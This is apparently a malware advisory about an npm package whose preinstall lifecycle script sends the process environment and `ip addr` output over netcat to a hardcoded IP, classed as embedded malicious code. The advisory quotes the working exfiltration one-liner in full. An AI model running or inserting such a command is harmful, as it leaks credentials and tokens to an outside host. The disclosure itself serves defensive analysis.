summary: preinstall exfiltrates environment variables and network configuration to hardcoded bare-IP over netcat
details: package.json declares a preinstall lifecycle script `(env; ip addr) | nc 49.13.60.225 888` that runs automatically on `npm install`. The script pipes the full process environment (which typically contains CI secrets, cloud credentials, and API tokens) and the output of `ip addr` (host network interface details) over a raw TCP connection to the bare IP 49.13.60.225 on port 888, with no TLS, no authentication, and no relation to any publisher domain. The declared source files src/index.ts and src/plugin.ts are 0 bytes, so the manifest lifecycle hook is the package's entire payload.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
